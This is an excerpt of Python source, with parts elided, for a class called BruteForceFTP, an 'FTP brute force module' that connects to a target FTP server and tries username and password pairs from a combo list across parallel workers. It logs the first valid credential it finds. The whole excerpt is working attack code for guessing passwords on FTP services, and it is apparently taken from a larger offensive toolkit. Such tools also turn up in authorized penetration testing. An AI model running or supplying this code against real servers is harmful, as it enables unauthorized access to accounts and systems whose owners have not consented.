...
class BruteForceFTP:
    def __init__(self, target_ip, target_port=21, combo_list=[], max_workers=10, max_errors=10):
        self.info = "FTP brute force module (enhanced)"
    ...
    def attempt_login(self, username, password):
        ...
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.targetIP, self.targetPORT, timeout=3)
            ftp.login(username, password)
            with self.lock:
                if not self.found:
                    self.found = True
                    self.valid_cred = (username, password)
                    logging.debug(f"Valid FTP credentials found: {username}:{password}")
            ftp.quit()
    ...
    def run(self):
        if not self.is_ftp_open():
            logging.warning("FTP port not open or target not reachable.")
            return None
